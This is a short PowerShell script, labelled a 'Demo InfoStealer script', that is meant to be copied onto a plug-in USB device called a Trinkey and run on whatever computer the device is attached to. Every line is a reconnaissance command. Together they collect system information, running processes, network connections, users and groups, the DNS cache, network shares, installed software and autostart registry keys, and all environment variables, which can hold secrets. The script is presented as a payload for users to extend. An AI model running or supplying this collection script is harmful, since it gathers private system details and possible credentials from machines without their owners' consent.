# Demo InfoStealer script, place it into F:\sd\demo.ps1 on your Trinkey. Extend or replace to your liking.
systeminfo
tasklist
netstat -ano
whoami /all
net user
net localgroup
Get-NetAdapter
ipconfig /all
ipconfig /displaydns
route print
net share
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /s
Get-PSDrive -PSProvider FileSystem
query user
Get-ChildItem Env:
bcdedit
Get-ChildItem
Write-Output "Finished"
